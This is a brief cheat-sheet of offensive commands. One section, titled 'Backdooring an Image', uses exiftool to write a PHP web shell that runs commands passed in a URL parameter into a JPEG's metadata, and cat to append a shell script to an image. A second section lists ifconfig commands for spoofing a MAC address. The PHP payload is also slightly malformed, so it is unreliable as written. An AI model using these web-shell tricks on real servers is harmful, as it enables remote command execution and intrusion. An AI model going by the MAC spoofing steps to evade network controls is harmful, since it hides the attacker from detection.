####Backdooring an Image####
exiftool -Comment="<?php passthru(\$_GET'cmd'); _halt_compiler(); ?>" /root/imagen.jpg
exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" /root/imagen.jpg
cat file.jpg shell.php > compress.jpg

*************Change Mac address(privileges root)*******************
# ifconfig [interface] down
# ifconfig [interface] hw ether 00:11:22:33:44:55
# ifconfig [interface] up
**************************************************
